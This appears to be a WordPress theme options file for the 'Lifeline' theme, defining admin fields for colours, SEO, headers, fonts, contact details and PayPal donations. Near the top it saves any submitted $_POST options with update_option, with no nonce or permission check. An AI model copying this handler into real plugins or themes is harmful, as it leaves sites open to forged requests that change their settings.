<?php
if(!class_exists('SH_Options')){
	get_template_part( 'framework/theme_options/options' );
}
function add_another_section($sections){
	
	$sections[] = array(
				'title' => __('A Section added by hook', SH_NAME),
				'desc' => __('<p class="description">This is a section created by adding a filter to the sections array, great to allow child themes, to add/remove sections from the options.</p>', SH_NAME),
				'icon' => trailingslashit(get_template_directory_uri()).'options/img/glyphicons/glyphicons_062_attach.png',
				'fields' => array()
				);
	
	return $sections;
	
}//function
function change_framework_args($args){
	return $args;
	
}//function
function setup_framework_options(){
$args = array();
//Set it to dev mode to view the class settings/info in the form - default is false
$args['dev_mode'] = true;
//google api key MUST BE DEFINED IF YOU WANT TO USE GOOGLE WEBFONTS
//Remove the default stylesheet? make sure you enqueue another one all the page will look whack!
//Add HTML before the form
$args['intro_text'] = __('<p>This is the HTML which can be displayed before the form, it isnt required, but more info is always better. Anything goes in terms of markup here, any HTML.</p>', SH_NAME);
//Setup custom links in the footer for share icons
$args['share_icons']['twitter'] = array(
										'link' => 'http://twitter.com/lee__mason',
										'title' => 'Folow me on Twitter', 
										'img' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_322_twitter.png'
										);
$args['share_icons']['linked_in'] = array(
										'link' => 'http://uk.linkedin.com/pub/lee-mason/38/618/bab',
										'title' => 'Find me on LinkedIn', 
										'img' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_337_linked_in.png'
										);
$args['opt_name'] = SH_NAME;
$args['menu_title'] = __('Theme Options', SH_NAME);
//Custom Page 4Title for options page - default is "Options"
$args['page_title'] = __('Lifeline Theme Options', SH_NAME );
//Custom page slug for options page (wp-admin/themes.php?page=***) - default is "nhp_theme_options"
$args['page_slug'] = 'sh_theme_options';
$args['page_type'] = 'submenu';
$args['page_parent'] = 'themes.php';
//custom page location - default 100 - must be unique or will override other items
$args['page_position'] = 27;
//Custom page icon class (used to override the page icon next to heading)
$args['page_icon'] = 'icon-themes';
		
//Set ANY custom page help tabs - displayed using the new help tab API, show in order of definition		
$args['help_tabs'][] = array(
							'id' => 'sh-opts-1',
							'title' => __('Theme Information 1', SH_NAME),
							'content' => __('<p>This is the tab content, HTML is allowed.</p>', SH_NAME)
							);
$args['help_tabs'][] = array(
							'id' => 'nhp-opts-2',
							'title' => __('Theme Information 2', SH_NAME),
							'content' => __('<p>This is the tab content, HTML is allowed.</p>', SH_NAME)
							);
//Set the Help Sidebar for the options page - no sidebar by default										
$args['help_sidebar'] = __('<p>This is the sidebar content, HTML is allowed.</p>', SH_NAME);
if( count($_POST) ) {
	if( $opt_name = sh_set( $_POST, $args['opt_name'] ) ) update_option( $args['opt_name'], $opt_name );
}
$sections = array();
$sections[] = array(
				'title' => __('General Settings', SH_NAME),
				'desc' => __('<p class="description">This section contains general options about the theme.</p>', SH_NAME),
				'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
				'id' => 'general_settings',
				'children' => array(
					array(
						'title' => __('General Settings', SH_NAME),
						'desc' => __('<p class="description">This section contains general options about the theme.</p>', SH_NAME),
						'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
						'id' => 'theme_general_settings',
						'fields' => array(
							array(
									'id' => 'dep_radio', //must be unique
									'type' => 'radio', //builtin fields include:
									'title' => __('Theme Color Scheme', SH_NAME),
									'desc' => __('Pick the color to apply for theme', SH_NAME),
									'options' => array('opt1' => 'General Color Scheme','opt2' => 'Predefined Color Scheme'),
									'attributes' => array('style' => 'width:40%'),
									'std' => 'opt1',
								),
								array(
									'id' => 'theme_general_color_scheme', //must be unique
									'type' => 'color', //builtin fields include:
									'title' => __('Theme Color Scheme', SH_NAME),
									'desc' => __('Pick the color to apply for theme', SH_NAME),
									'attributes' => array('style' => 'width:40%'),
									'std' => '#4FC0AA',
									'dependent' => 'opt1' ,
									''
								),
								array(
									'type' => 'select', //builtin fields include:
									'id' => 'theme_color_scheme',
									'title' => __('Predefined Color Schemes', SH_NAME),
									'options' => array(
										'brown' => 'Brown',
										'bright-red' => 'Bright Red',
										'yellow' => 'Yellow',
										'green' => 'Green',
										'hunter-green' => 'Hunter Green',
										'light-pink' => 'Light Pink',
										'orange' => 'Orange',
										'pink' => 'Pink',
										'red' => 'Red',
										'sea-green' => 'Sea Green',
										'bourbon'=>'Bourbon',
										'como'=>'Como',
										'deep-pink'=>'Deep Pink',
										'drove-gray'=>'Drove Gray',
										'pacific-blue'=>'Pacific Blue',
									),
									'desc' => __('Choose One of Our Predefined Color Schemes', SH_NAME),
									'attributes' => array('style' => 'width:40%'),
									'std' => '',
									'dependent'=> 'opt2',),
								
								array(
										'id' => 'sh_rtl', //must be unique
										'type' => 'button_set', //builtin fields include:
										'title' => __('RTL(Right to Left)', SH_NAME),
										'desc' => __('Turn RTL On or Off', SH_NAME),
										'attributes' => array('style' => 'width:40%'),
									),
								array(
										'id' => 'sh_seo_status', //must be unique
										'type' => 'button_set', //builtin fields include:
										'title' => __('SEO Status', SH_NAME),
										'desc' => __('Turn This Option On to enable SEO', SH_NAME),
									),
								array(
										'id' => 'sh_post_types_seo', //must be unique
										'type' => 'multi_select', //builtin fields include:
										'title' => __('Post Types', SH_NAME),
										'desc' => __('Select Post Types for SEO.', SH_NAME),
										'options' => sh_get_post_types(),
									),
								array(
									'id' => 'homepage_meta_title', //must be unique
									'type' => 'text', //builtin fields include:
									'title' => __('Homepage Meta Title', SH_NAME),
									'desc' => __('Enter Homepage Meta Title', SH_NAME),
									'attributes' => array('class'=>'input-field')
								),
								array(
										'id' => 'homepage_meta_desc', //must be unique
										'type' => 'textarea', //builtin fields include:
										'title' => __('Homepage Meta Description', SH_NAME),
										'desc' => __('Enter Homepage Meta Description.', SH_NAME),
									),
								array(
										'id' => 'homepage_meta_keywords', //must be unique
										'type' => 'textarea', //builtin fields include:
										'title' => __('Homepage Meta Key words', SH_NAME),
										'desc' => __('Enter Homepage Meta Key words.', SH_NAME),
									),
								array(
										'id' => 'custom_css', //must be unique
										'type' => 'textarea', //builtin fields include:
										'title' => __('Custom Style', SH_NAME),
										'desc' => __('Please Input custom css Enclosed with Style Tag.', SH_NAME),
									),	
							),
							
						),
					array(
						'title' => __('Archive Pages Meta Title Settings', SH_NAME),
						'desc' => __('<p class="description">This section contains top bar settings</p>', SH_NAME),
						'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
						'id' => 'archive_pages_settings',
						'fields' => array(
								array(
									'id' => 'seperator', //must be unique
									'type' => 'text', //builtin fields include:
									'title' => __('Seperator', SH_NAME),
									'desc' => __('Enter Seperator Character', SH_NAME),
									'attributes' => array('class'=>'input-field')
								),
								array(
									'id' => 'title_setting', //must be unique
									'type' => 'select', //builtin fields include:
									'title' => __('After Seperator', SH_NAME),
									'desc' => __('Choose what should be displayed after seperator.', SH_NAME),
									'options' => array('' => 'No Description' , 'name' => 'Site Title' , 'description' => 'Site Description')
								),
							),
							
						),
					array(
						'title' => __('Top Bar Settings', SH_NAME),
						'desc' => __('<p class="description">This section contains top bar settings</p>', SH_NAME),
						'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
						'id' => 'top_bar_settings',
						'fields' => array(
								array(
									'id' => 'header_address', //must be unique
									'type' => 'text', //builtin fields include:
									'title' => __('Address', SH_NAME),
									'desc' => __('Enter address to be displayed in top bar', SH_NAME),
									'attributes' => array('class'=>'input-field')
								),
								array(
									'id' => 'header_phone_number', //must be unique
									'type' => 'text', //builtin fields include:
									'title' => __('Phone Number', SH_NAME),
									'desc' => __('Enter phone number to be displayed in top bar', SH_NAME),
									'attributes' => array('class'=>'input-field')
								),
								array(
									'id' => 'header_email_address', //must be unique
									'type' => 'text', //builtin fields include:
									'title' => __('Email Address', SH_NAME),
									'desc' => __('Enter email address to be displayed in top bar', SH_NAME),
									'attributes' => array('class'=>'input-field')
								),
							),
							
						),
						
					array(
						'title' => __('Choose Header Style', SH_NAME),
						'desc' => __('<p class="description">This section contains general options about the theme.</p>', SH_NAME),
						'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
						'id' => 'sub_general_settings',
						'fields' => array(
								array(
									'type'=>'image_boxes',
									'id' => 'custom_header',
									'title' => '',
									'attributes' => array('style' => 'width:40%'),
									'options'=> array(
												'dafault'=>array('label'=>'<ul><li>Left Side Logo</li><li>Right Side Menu</li></ul>', 'img'=>'/images/Sticky-Header.jpg'),
												'toggle'=>array('label'=>'<ul><li>Header Toggle</li><li>Right Side Menu</li></ul>', 'img'=>'/images/toggle-Header.jpg'),
												'middle_aligned'=>array('label'=>'<ul><li>Middle Logo</li><li>Down Menu</li></ul>', 'img'=>'/images/with-logo-in-the-mid.jpg'),
												'middle_aligned'=>array('label'=>'<ul><li>Middle Logo</li><li>Down Menu</li></ul>', 'img'=>'/images/with-logo-in-the-mid.jpg'),
												'social-icon'=>array('label'=>'<ul><li>Header With Social icons</li></ul>', 'img'=>'/images/header-social.jpg'),
												'counter'=>array('label'=>'<ul><li>Header With Counter</li></ul>', 'img'=>'/images/header-count.jpg'),
									),
									'desc' => __('Sort the modules through drag & drop.', SH_NAME),
									'std' => '',
									'settings' => array( 'hide_title'=>true )
								),
								
								array(
										'id' => '', //must be unique
										'type' => 'heading', //builtin fields include:
										'heading'=>__('Sticky Option', SH_NAME)
									),
									array(
										'id' => 'sh_custom_stickey_menu', //must be unique
										'type' => 'button_set', //builtin fields include:
										'title' => __('Stickey Header', SH_NAME),
										'desc' => __('Turn This Option On to Make any "Non Sticky Header" , Stikcey.', SH_NAME),
									),
									array(
										'id' => '', //must be unique
										'type' => 'heading', //builtin fields include:
										'heading'=>__('Header Setting for Header with social icon', SH_NAME)
									),
									array(
										'id' => 'sh_show_soical_icons', //must be unique
										'type' => 'button_set', //builtin fields include:
										'title' => __('Social Icons', SH_NAME),
										'desc' => __('Show or hide social icons in this header style', SH_NAME),
									),
									array(
										'id' => 'sh_show_donate_btn', //must be unique
										'type' => 'button_set', //builtin fields include:
										'title' => __('Donate Button', SH_NAME),
										'desc' => __('Show or hide Donate Button in this header style.', SH_NAME),
									),
									array(
										'id' => 'sh_show_donate_btn_txt', //must be unique
										'type' => 'text', //builtin fields include:
										'title' => __('Button Text', SH_NAME),
										'desc' => __('Enter the text for donation button.', SH_NAME),
									),
								
								array(
										'id' => '', //must be unique
										'type' => 'heading', //builtin fields include:
										'heading'=>__('Header Setting for Header with Counter', SH_NAME)
									),
								array(
										'id' => 'sh_show_event_counter', //must be unique
										'type' => 'button_set', //builtin fields include:
										'title' => __('Show Event', SH_NAME),
										'desc' => __('Show or hide Event Countdown in this header style.', SH_NAME),
									),
								array(
										'id' => 'sh_counter_post', //must be unique
										'type' => 'select', //builtin fields include:
										'title' => __('Select Event', SH_NAME),
										'desc' => '',
										'options' => sh_get_posts_array( 'dict_event' )
									),
								array(
									'id' => '', //must be unique
									'type' => 'heading', //builtin fields include:
									'heading'=>__('Logo Settings', SH_NAME)
								),
								array(
									'id' => 'site_favicon', //must be unique
									'type' => 'upload', //builtin fields include:
									'title' => __('Upload your Favicon From Here', SH_NAME),
									'title' => __('Favicon', SH_NAME),
									'desc' => __('The Favicon size shold be 16x16 px.', SH_NAME),
								),
								array(
									'id' => 'logo_text_status', //must be unique
									'type' => 'button_set', //builtin fields include:
									'title' => __('Use Logo Text', SH_NAME),
									'desc' => __('Use Text Instead of Logo Click the Button to On of Off the Text in the header instead of Logo', SH_NAME),
								),
								
								array(
									'id' => 'logo_text', //must be unique
									'type' => 'text', //builtin fields include:
									'title' => __('Logo Text', SH_NAME),
									'desc' => __('Enter the Text here, you want to as Logo', SH_NAME),
									'attributes' => array('class'=>'input-field')
								),
								
								array(
									'id' => 'logo_text_color', //must be unique
									'type' => 'color', //builtin fields include:
									'title' => __('Logo Color', SH_NAME),
									'desc' => __('Pick color for Logo text', SH_NAME),
								),
								
								array(
									'id' => 'logo_font', //must be unique
									'type' => 'multi_fields', //builtin fields include:
									'title' => __('Logo Font Settings', SH_NAME),
									'desc' => __('Set Logo Font Settings', SH_NAME),
									'fields' => array(
										array(
											'id' => 'logo_text_font_size', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Size', SH_NAME),
											'desc' => '',
											'options' => array_combine(range(2, 40, 2), range(2, 40, 2))
										),
										array(
											'id' => 'logo_text_font_family', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Family', SH_NAME),
											'desc' => '',

											'options' => sh_set( sh_google_fonts(), 'family' )
										),
										array(
											'id' => 'logo_text_font_style', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Style', SH_NAME),
											'desc' => '',
											'options' => sh_set( sh_google_fonts(), 'style' )
										),
									)
								),
								array(
									'id' => 'site_salogan', //must be unique
									'type' => 'text', //builtin fields include:
									'title' => __('Site Slogan', SH_NAME),
									'desc' => __('Enter the Sub-heading or Tag Line to show below Logo Upload your site Logo here', SH_NAME),
								),
								
								array(
									'id' => 'slogan_settings', //must be unique
									'type' => 'multi_fields', //builtin fields include:
									'title' => __('Slogan Settings', SH_NAME),
									'desc' => __(' Choose the salogan settings here', SH_NAME),
									'fields' => array(
										array(
											'id' => 'salogan_font_size', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Size', SH_NAME),
											'desc' => '',
											'options' => array_combine(range(2, 40, 2), range(2, 40, 2))
										),
										array(
											'id' => 'salogan_font_family', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Family', SH_NAME),
											'desc' => '',
											'options' => sh_set( sh_google_fonts(), 'family' )
										),
										array(
											'id' => 'salogan_font_style', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Style', SH_NAME),
											'desc' => '',
											'options' => sh_set( sh_google_fonts(), 'style' )
										),
									)
								),
								
								array(
									'id' => 'logo_image', //must be unique
									'type' => 'upload', //builtin fields include:
									'title' => __('Logo Image', SH_NAME),
									'desc' => __('Upload Logo here but be sure that the Logo Text button should be Off', SH_NAME),
								),
								
								array(
									'id' => 'logo_size', //must be unique
									'type' => 'multi_fields', //builtin fields include:
									'title' => __('Logo Size', SH_NAME),
									'desc' => __('Select the Height and Width of the Logo image to show in the header', SH_NAME),
									'fields' => array(
										array(
											'id' => 'logo_width', //must be unique
											'type' => 'text', //builtin fields include:
											'title' => __('Logo Width', SH_NAME),
											'desc' => '',
											'options' => array_combine(range(6, 100, 2), range(6, 100, 2))
										),
										array(
											'id' => 'logo_height', //must be unique
											'type' => 'text', //builtin fields include:
											'title' => __('Logo Height', SH_NAME),
											'desc' => '',
											'options' => array_combine(range(6, 36, 2), range(6, 36, 2))
										),
									)
								),
							),
							
						),
						
						array(
							'title' => __('Footer Settings', SH_NAME),
							'desc' => __('<p class="description">This section contains footer options about the theme.</p>', SH_NAME),
							'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
							'id' => 'sub_footer_settings',
							
							'fields' => array(
								array(
									'id' => 'show_footer', //must be unique
									'type' => 'button_set', //builtin fields include:
													 
									'title' => __('Show Footer', SH_NAME),
									'desc' => __('Enable / Disable footer area', SH_NAME),
									'options' => array('1'=>'Enable', '0' => 'Disable')
								),
								array(
									'id' => 'footer_bg', //must be unique
									'type' => 'upload', //builtin fields include:
									'title' => __('Footer Background', SH_NAME),
									'desc' => __('Upload Image to change Footer Background', SH_NAME),
								),
								array(
									'id' => 'footer_copyright', //must be unique
									'type' => 'textarea', //builtin fields include:
													 
									'title' => __('Footer Copyright Text', SH_NAME),
									'desc' => __('Enter the Copyrights Text here to show in the Footer You can use HTML tags in this area as well', SH_NAME),
								),
								array(
									'id' => 'footer_analytics', //must be unique
									'type' => 'textarea', //builtin fields include:
													 
									'title' => __('Footer Analytics / Scripts', SH_NAME),
									'desc' => __('In this area you can put Google Analytics Code or any other Script that you want to be included in the footer before the Body tag. Note: do not use script tags.', SH_NAME),
								),
								
							),
						),
						
					
					)
			);
/** Contact Section */
$sections[] = array(
				'title' => __('Contact Page Options', SH_NAME),
				'desc' => __('<p class="description">This section contains general options about the theme.</p>', SH_NAME),
				'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
				'id' => 'contact_page_options',
				
				'children' => array(
					array(
							'title' => __('Contact Page Settings', SH_NAME),
							'desc' => __('<p class="description">This section contains contact options about the theme.</p>', SH_NAME),
							'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
							'id' => 'sub_contact_settings',
							
							'fields' => array(
								array(
									'id' => 'contact_email', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Contact Email', SH_NAME),
									'desc' => __('Enter the email address where do you want to recieve emails sent through contact form', SH_NAME),
									'std'=> get_bloginfo( 'admin_email' )
								),
								array(
									'id' => 'success_message', //must be unique
									'type' => 'textarea', //builtin fields include:
													 
									'title' => __('Success Message', SH_NAME),
									'desc' => __('Enter the Success Code to show once the email is sent through contact form', SH_NAME),
								),
								array(
									'id' => 'captcha_status', //must be unique
									'type' => 'button_set', //builtin fields include:
													 
									'title' => __('Captcha Status', SH_NAME),
									'desc' => __('Enable / disable google recaptcha on contact form', SH_NAME),
								),
								
								array(
									'id' => 'captcha_api', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Captcha API Key', SH_NAME),
									'desc' => __('Enter the captcha API key of your Google account.', SH_NAME),
								),
								array(
									'id' => 'captcha_secret_key', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Captcha Secret', SH_NAME),
									'desc' => __('Enter the secret key of your Google account.', SH_NAME),
								),
								
								array(
									'id' => 'google_map_code', //must be unique
									'type' => 'textarea', //builtin fields include:
													 
									'title' => __('Google Map Code', SH_NAME),
									'desc' => __('Enter the Google Map Code of your company or office to be shown on Contact Us page.', SH_NAME),
								),
							),
						),
					array(
							'title' => __('Contact Information', SH_NAME),
							'desc' => __('<p class="description">This section contains contact options about the theme.</p>', SH_NAME),
							'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
							'id' => 'contact_information',
							
							'fields' => array(
								array(
										'id' => 'contact_page_address', //must be unique
										'type' => 'text', //builtin fields include:
										'title' => __('ADDRESS', SH_NAME),
										'desc' => __('Enter the Address you want to show on Contact Page', SH_NAME),
										'attributes' => array('style' => 'width:40%'),
										'std' => '',
                                      ),
								array(
										'id' => 'contact_page_phone', //must be unique
										'type' => 'text', //builtin fields include:
										'title' => __('Phone', SH_NAME),
										'desc' => __('Enter the Phone Number you want to show on Contact Page', SH_NAME),
										'attributes' => array('style' => 'width:40%'),
										'std' => '',
                                      ),
								array(
										'id' => 'contact_page_email', //must be unique
										'type' => 'text', //builtin fields include:
										'title' => __('Email', SH_NAME),
										'desc' => __('Enter the Email Address you want to show on Contact Page', SH_NAME),
										'attributes' => array('style' => 'width:40%'),
										'std' => '',
                                      ),
								array(
										'id' => 'contact_page_website', //must be unique
										'type' => 'text', //builtin fields include:
										'title' => __('Website', SH_NAME),
										'desc' => __('Enter the Website URL you want to show on Contact Page', SH_NAME),
										'attributes' => array('style' => 'width:40%'),
										'std' => '',
                                      ),
								array(
										'id' => 'contact_page_text', //must be unique
										'type' => 'textarea', //builtin fields include:
										'title' => __('Text', SH_NAME),
										'desc' => __('Enter the Text you want to show on Contact Page', SH_NAME),
										'attributes' => array('style' => 'width:40%'),
										'std' => '',
                                      ),
							
								
							),
						),
					array(
							'title' => __('Social Media', SH_NAME),
							'desc' => __('<p class="description">This section contains contact options about the theme.</p>', SH_NAME),
							'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
							'id' => 'contact_social_media',
							
							'fields' => array(
								array(
										'id' => 'social_section_title', //must be unique
										'type' => 'text', //builtin fields include:
										'title' => __('Title', SH_NAME),
										'desc' => __('Enter the Title you want to show in Social Networking Section', SH_NAME),
										'attributes' => array('style' => 'width:40%'),
										'std' => ''
                                      ),
								array(
									'id' => 'contact_rss', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('RSS Link', SH_NAME),
									'desc' => __('Enter the RSS link', SH_NAME),
									'std'=> '' 
								),
								array(
									'id' => 'contact_facebook', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Facebook Link', SH_NAME),
									'desc' => __('Enter the Facebook Link', SH_NAME),
								),
								array(
									'id' => 'contact_twitter', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Twitter Link', SH_NAME),
									'desc' => __('Enter the Twitter Link', SH_NAME),
								),
								array(
									'id' => 'contact_linkedin', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Linkedin Link', SH_NAME),
									'desc' => __('Enter Linkedin Link', SH_NAME),
								),
								
								array(
									'id' => 'contact_gplus', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Google Plus', SH_NAME),
									'desc' => __('Enter the Google Plus Link.', SH_NAME),
								),
								array(
									'id' => 'contact_pintrest', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Pintrest Link', SH_NAME),
									'desc' => __('Enter the Pinterest Link.', SH_NAME),
								),
								
							),
						),
					array(
							'title' => __('Countries Slider', SH_NAME),
							'desc' => __('<p class="description">This section contains contact options about the theme.</p>', SH_NAME),
							'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
							'id' => 'contact_countries',
							
							'fields' => array(
							
								array(
										'id' => 'country_section_title', //must be unique
										'type' => 'text', //builtin fields include:
										'title' => __('Title', SH_NAME),
										'desc' => __('Enter the Title you want to show in countries Slider', SH_NAME),
										'attributes' => array('style' => 'width:40%'),
										'std' => ''
                                      ),
							 	array(
										'id' => 'country_section_text', //must be unique
										'type' => 'textarea', //builtin fields include:
										'title' => __('Text', SH_NAME),
										'desc' => __('Enter the Text you want to show in countries Slider', SH_NAME),
										'attributes' => array('style' => 'width:40%'),
										'std' => ''
                                      ),
								array(
                                    'id' => 'contact_countries', //must be unique
                                    'type' => 'multi_group', //builtin fields include:
                                    'title' => __('Add Countries', SH_NAME),
                                    'desc' => __('Add Countries here ', SH_NAME),
                                    'attributes' => array('style' => 'width:40%'),
                                    'std' => '',
                                    'field'=>array(
                                            array(
                                                'id' => 'contact_country_img', //must be unique
                                                'type' => 'upload', //builtin fields include:
                                                'title' => __('Country Image ', SH_NAME),
                                                'desc' => __('Upload Country Image', SH_NAME),
                                                'attributes' => array('style' => 'width:40%'),
                                                'std' => ''
                                            ),
										 )
							),
							),
						),
						
					
						
					)
			);
/** Font Settings */
$sections[] = array(
				'title' => __('Font Options', SH_NAME),
				'desc' => __('<p class="description">This section contains general options about the theme.</p>', SH_NAME),
				'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
				'id' => 'font_options',
				
				'children' => array(
					array(
						'title' => __('Heading Fonts', SH_NAME),
						'desc' => __('<p class="description">This section contains general options about the theme.</p>', SH_NAME),
						'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
						'id' => 'sub_heading_fonts',
						'fields' => array(
								
								array(
									'type'=>'multi_fields',
									'id' => 'h1_typography',
									'title' => __('H1 Typography', SH_NAME),
									'desc' => __('Change the Typography Settings of H1 ', SH_NAME),
									'fields' => array(
										
										array(
											'id' => 'h1_font_family', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Family', SH_NAME),
											'desc' => '',
											'options' => sh_set( sh_google_fonts(), 'family')
										),
										
									)
								),
								
								array(
									'type'=>'multi_fields',
									'id' => 'h2_typography',
									'title' => __('H2 Typography', SH_NAME),
									'desc' => __('Change the Typography Settings of H2', SH_NAME),
									'fields' => array(
										
										array(
											'id' => 'h2_font_family', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Family', SH_NAME),
											'desc' => '',
											'options' => sh_set( sh_google_fonts(), 'family')
										),
										
									)
								),
								
								array(
									'type'=>'multi_fields',
									'id' => 'h3_typography',
									'title' => __('H3 Typography', SH_NAME),
									'desc' => __('Change the Typography Settings of H3', SH_NAME),
									'fields' => array(
										
										array(
											'id' => 'h3_font_family', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Family', SH_NAME),
											'desc' => '',
											'options' => sh_set( sh_google_fonts(), 'family')
										),
										
									)
								),
								
								array(
									'type'=>'multi_fields',
									'id' => 'h4_typography',
									'title' => __('H4 Typography', SH_NAME),
									'desc' => __('Change the Typography Settings of H4', SH_NAME),
									'fields' => array(
										
										array(
											'id' => 'h4_font_family', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Family', SH_NAME),
											'desc' => '',
											'options' => sh_set( sh_google_fonts(), 'family')
										),
										
									)
								),
								
								array(
									'type'=>'multi_fields',
									'id' => 'h5_typography',
									'title' => __('H5 Typography', SH_NAME),
									'desc' => __('Change the Typography Settings of H5', SH_NAME),
									'fields' => array(
										
										array(
											'id' => 'h5_font_family', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Family', SH_NAME),
											'desc' => '',
											'options' => sh_set( sh_google_fonts(), 'family')
										),
										
									)
								),
								
								array(
									'type'=>'multi_fields',
									'id' => 'h6_typography',
									'title' => __('H6 Typography', SH_NAME),
									'desc' => __('Change the Typography Settings of H6', SH_NAME),
									'fields' => array(
										
										array(
											'id' => 'h6_font_family', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Family', SH_NAME),
											'desc' => '',
											'options' => sh_set( sh_google_fonts(), 'family')
										),
										
									)
								),
								
								
								
							),
							
						),
						
						array(
							'title' => __('Body Font', SH_NAME),
							'desc' => __('<p class="description">This section contains general options about the theme.</p>', SH_NAME),
							'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
							'id' => 'sub_body_font',
							
							'fields' => array(
								array(
									'type'=>'multi_fields',
									'id' => 'body_typography',
									'title' => __('Body Font Options', SH_NAME),
									'desc' => __('Change the Typography Settings of Body tag', SH_NAME),
									'fields' => array(
										
										array(
											'id' => 'body_font_family', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Family', SH_NAME),
											'desc' => '',
											'options' => sh_set( sh_google_fonts(), 'family')
										),
										
									)
								),
								array(
									'type'=>'multi_fields',
									'id' => 'grey_area_typography',
									'title' => __('Grey Area Typography', SH_NAME),
									'desc' => __('Change the Typography Settings of Grey Area.', SH_NAME),
									'fields' => array(
										
										array(
											'id' => 'grey_area_font_family', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Family', SH_NAME),
											'desc' => '',
											'options' => sh_set( sh_google_fonts(), 'family')
										),
										
									)
								),
								array(
									'type'=>'multi_fields',
									'id' => 'footer_typography',
									'title' => __('Footer Options', SH_NAME),
									'desc' => __('Change the Typography Settings of Footer area', SH_NAME),
									'fields' => array(
										
										array(
											'id' => 'footer_font_family', //must be unique
											'type' => 'select', //builtin fields include:
											'title' => __('Font Family', SH_NAME),
											'desc' => '',
											'options' => sh_set( sh_google_fonts(), 'family')
										),
										
									)
								),
								
							),
						),
						
					)
			);
$sections[] = array(
				'title' => __('Donation Settings', SH_NAME),
				'desc' => __('<p class="description">This section contains general options about the theme.</p>', SH_NAME),
				'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
				'id' => 'donation_settings',
				'children' => array(
					array(
						'title' => __('Donation Settings', SH_NAME),
						'desc' => __('<p class="description">This section contains general options about the theme.</p>', SH_NAME),
						'icon' => get_template_directory().'/framework/theme_options/img/glyphicons/glyphicons_023_cogwheels.png',
						'id' => 'sub_donation_settings',
						'fields' => array(
								array(
									'id' => 'paypal_type', //must be unique
									'type' => 'select', //builtin fields include:
									'title' => __('Paypal Type', SH_NAME),
									'desc' => __('Select Which Paypal Version you want to use - Live or Sandbox', SH_NAME),
									'options' => array('live'=>'Live', 'sandbox' => 'Sandbox')
								),
								array(
									'id' => 'donate_method', //must be unique
									'type' => 'button_set', //builtin fields include:
									'title' => __('Donate Popup', SH_NAME),
									'desc' => __('Enable to show poup box for donation', SH_NAME)
								),
								array(
									'id' => 'paypal_title', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Title', SH_NAME),
									'desc' => __('Enter the title show on header paypal donation section', SH_NAME),
								),
								array(
									'type' => 'select', //builtin fields include:
									'id' => 'currency_code',
									'title' => __('Currency Code', SH_NAME),
									'options' => sh_get_currencies(),
									'desc' => __('Select Currency Symbol', SH_NAME),
									'attributes' => array('style' => 'width:40%'),
								),
								array(
									'id' => 'paypal_currency', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Currency Symbol', SH_NAME),
									'std' => '$'
								),
								array(
									'id' => 'paypal_raised', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Raised', SH_NAME),
									'std' => '0'
								),
								array(
									'id' => 'paypal_target', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Target', SH_NAME),
									'std' => '25000'
								),
								array(
									'id' => 'paypal_contact', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Contact Number', SH_NAME),
									'std' => ''
								),
								array(
									'id' => 'paypal_username', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Paypal Username', SH_NAME),
									'desc' => __('Enter the paypal username. To get API username <a href="http://developer.paypal.com">visit</a>', SH_NAME),
									'options' => array('live'=>'Live', 'sandbox' => 'Sandbox')
								),
								array(
									'id' => 'paypal_api_username', //must be unique
									'type' => 'text', //builtin fields include:
													 
									'title' => __('Paypal API Username', SH_NAME),
									'desc' => __('Enter the paypal API username', SH_NAME),
								),
								
								array(
									'id' => 'paypal_api_password', //must be unique
									'type' => 'text', //builtin fields include:
													 
